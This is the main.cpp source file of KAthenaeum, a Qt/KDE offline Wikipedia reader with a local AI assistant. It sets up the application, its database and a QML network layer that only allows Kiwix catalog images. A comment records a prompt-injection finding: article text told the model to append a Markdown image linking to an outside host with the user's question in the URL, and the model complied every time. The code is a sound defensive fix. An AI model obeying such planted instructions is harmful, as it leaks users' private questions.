// SPDX-License-Identifier: GPL-3.0-or-later
#include <QApplication>
#include <QMessageBox>
#include <QDir>
#include <QFile>
#include <QNetworkAccessManager>
#include <QNetworkDiskCache>
#include <QQmlNetworkAccessManagerFactory>
#include <QStandardPaths>
#include <QQmlApplicationEngine>
#include <QQuickStyle>
#include <QQuickWindow>
#include <QQuickWebEngineProfile>
#include <QtWebEngineQuick>

#include <KAboutData>
#include <KCrash>
#include <KDBusService>
#include <KWindowSystem>
#include <KIconTheme>
#include <KLocalizedQmlContext>
#include <KLocalizedString>

#include "appstate.h"
#include "core/extract.h"
#include "librarymanager.h"
#include "mapmanager.h"
#include "articlestore.h"
#include "modelsettings.h"
#include "projectlist.h"
#include "zimschemehandler.h"
#include "core/catalog.h"
#include "core/database.h"
#include "kathenaeum-version.h"

namespace
{
// The QML engine's network access: catalog illustrations from kiwix.org (that address shape only, see
// Catalog::isIllustrationUrl), and nothing else. Any text a QML item renders
// as rich text or Markdown (a ZIM title, a snippet, a model's answer) could otherwise make the app fetch an image from
// anywhere: an article told the model to end its answer with ![](http://host/?q=<the question>), and it did, 4 times out
// of 4 (the review, 2026-10-19). The app is offline by design; this keeps it so whatever text is shown.
class KiwixOnlyAccess : public QNetworkAccessManager
{
public:
    using QNetworkAccessManager::QNetworkAccessManager;

protected:
    QNetworkReply *createRequest(Operation op, const QNetworkRequest &request, QIODevice *data) override
    {
        // data: URLs never leave the computer: installed libraries' icons come from the database that way (refusing them
        // too left every library without its icon)
        if (op == GetOperation && (Catalog::isIllustrationUrl(request.url()) || request.url().scheme() == QLatin1String("data")))
            return QNetworkAccessManager::createRequest(op, request, data);
        qWarning("Refused a network request from the interface: %s", qUtf8Printable(request.url().toDisplayString(QUrl::RemoveQuery)));
        return QNetworkAccessManager::createRequest(GetOperation, QNetworkRequest(QUrl(QStringLiteral("refused:"))), nullptr);
    }
};

// Images QML loads from the network (catalog illustrations) are kept on disk, so scrolling the catalog again or opening it
// offline does not fetch them again.
class CachingNetworkFactory : public QQmlNetworkAccessManagerFactory
{
public:
    QNetworkAccessManager *create(QObject *parent) override
    {
        auto *nam = new KiwixOnlyAccess(parent);
        auto *cache = new QNetworkDiskCache(nam);
        cache->setCacheDirectory(QDir(QStandardPaths::writableLocation(QStandardPaths::CacheLocation)).filePath(QStringLiteral("qml-network")));
        cache->setMaximumCacheSize(50 << 20);
        nam->setCache(cache);
        return nam;
    }
};
}

int main(int argc, char *argv[])
{
    KIconTheme::initTheme();
    initXmlParser();  // once, on the main thread, before any worker parses HTML
    ZimSchemeHandler::registerScheme();  // before any web engine profile exists
    QtWebEngineQuick::initialize();  // must run before the application object exists
    QQuickWindow::setGraphicsApi(QSGRendererInterface::OpenGL);  // MapLibre draws the map with OpenGL
    QApplication app(argc, argv);    // QApplication, not QGuiApplication: the desktop style needs widgets

    // Follow Plasma's look when the user has not chosen a Qt Quick style themselves
    if (qEnvironmentVariableIsEmpty("QT_QUICK_CONTROLS_STYLE"))
        QQuickStyle::setStyle(QStringLiteral("org.kde.desktop"));

    KLocalizedString::setApplicationDomain("kathenaeum");

    KAboutData about(QStringLiteral("kathenaeum"),
                     i18n("KAthenaeum"),
                     QStringLiteral(KATHENAEUM_VERSION_STRING),
                     i18n("A private, offline Wikipedia library with an AI research assistant"),
                     KAboutLicense::GPL_V3,
                     i18n("© 2026 Jaimie Garner"));
    about.addAuthor(i18n("Jaimie Garner"));
    about.setOtherText(i18n("Articles come from Wikipedia through Kiwix ZIM files and are under their own licence (Wikipedia: CC BY-SA 4.0). "
                            "Answers are written by models running on this computer through Ollama; nothing leaves it. "
                            "KAthenaeum is the desktop version of Athenaeum."));
    about.addComponent(QStringLiteral("libzim"), i18n("Reads ZIM files"), QString(), QStringLiteral("https://github.com/openzim/libzim"));
    about.addComponent(QStringLiteral("Kiwix"), i18n("The library catalog and its ZIM files"), QString(), QStringLiteral("https://kiwix.org"));
    about.addComponent(QStringLiteral("Ollama"), i18n("Runs the language and embedding models"), QString(), QStringLiteral("https://ollama.com"));
    about.addComponent(QStringLiteral("MapLibre Native"), i18n("Draws the maps"), QString(), QStringLiteral("https://maplibre.org"));
    about.addComponent(QStringLiteral("Protomaps"), i18n("The map tiles and their style"), QString(), QStringLiteral("https://protomaps.com"));
    about.addComponent(QStringLiteral("OpenStreetMap"), i18n("Map data © OpenStreetMap contributors (ODbL)"), QString(),
                       QStringLiteral("https://www.openstreetmap.org/copyright"));
    about.addComponent(QStringLiteral("Geofabrik"), i18n("The regions and their OpenStreetMap extracts"), QString(), QStringLiteral("https://download.geofabrik.de"));
    about.addComponent(QStringLiteral("Athenaeum"), i18n("The web application this one is based on"), QString(),
                       QStringLiteral("https://github.com/pacificnm/Athenaeum"));
    about.setHomepage(QStringLiteral("https://github.com/pacificnm/KAthenaeum"));
    // without it, "Report a Bug" went to bugs.kde.org, which has no KAthenaeum product
    about.setBugAddress(QByteArrayLiteral("https://github.com/pacificnm/KAthenaeum/issues"));
    about.setDesktopFileName(QStringLiteral(APP_ID));
    about.setOrganizationDomain("pacificnm.github.io");
    KAboutData::setApplicationData(about);
    QApplication::setWindowIcon(QIcon::fromTheme(QStringLiteral("kathenaeum")));

    KCrash::initialize();
    KDBusService service(KDBusService::Unique);  // a second launch raises the running window

    QString dbError;
    const QString dbPath = Database::defaultPath();
    if (!Database::open(dbPath, &dbError)) {
        // Without its database the app would lose every chat, note and library it is given: say so and stop
        QMessageBox::critical(nullptr, i18n("KAthenaeum"),
                              i18n("KAthenaeum cannot open its database, so it will not start.\n\n%1\n\nThe database is %2. Nothing in it has been changed.",
                                   dbError, dbPath));
        return 1;
    }
    AppState::instance()->setDatabase(dbPath, dbError);
    LibraryManager *libraries = LibraryManager::createInstance(&app);
    ModelSettings::createInstance(&app)->refresh();  // is Ollama there, with the models? (one quick local request)
    // an article caches its rendered page with its saved excerpts marked: a project change may change those
    QObject::connect(ProjectsNotifier::instance(), &ProjectsNotifier::changed, &app, [] {
        ArticleStore::clear();
    });
    libraries->initialize();
    MapManager::createInstance(&app)->initialize();  // resumes queued map downloads

    // Articles come from zim:// only. Nothing the reader shows needs a disk cache or cookies.
    QQuickWebEngineProfile *profile = QQuickWebEngineProfile::defaultProfile();
    profile->setHttpCacheType(QQuickWebEngineProfile::MemoryHttpCache);
    profile->setPersistentCookiesPolicy(QQuickWebEngineProfile::NoPersistentCookies);
    profile->installUrlSchemeHandler("zim", new ZimSchemeHandler(&app));

    CachingNetworkFactory networkFactory;  // declared first: the engine uses it until the engine is destroyed
    QQmlApplicationEngine engine;
    engine.setNetworkAccessManagerFactory(&networkFactory);
    KLocalization::setupLocalizedContext(&engine);
    // MapLibre's QML plugin, in the app's private folder (the build directory has the same layout)
    engine.addImportPath(QDir(QCoreApplication::applicationDirPath() + QStringLiteral("/..")).filePath(QStringLiteral(KATHENAEUM_MAPLIBRE_QML)));
    engine.loadFromModule("KAthenaeum", "Main");
    if (engine.rootObjects().isEmpty())
        return 1;
    // a second launch asks this one to come forward
    if (auto *window = qobject_cast<QQuickWindow *>(engine.rootObjects().constFirst())) {
        QObject::connect(&service, &KDBusService::activateRequested, window, [window] {
            KWindowSystem::updateStartupId(window);
            KWindowSystem::activateWindow(window);
            window->show();
            window->raise();
        });
    }

    return app.exec();
}
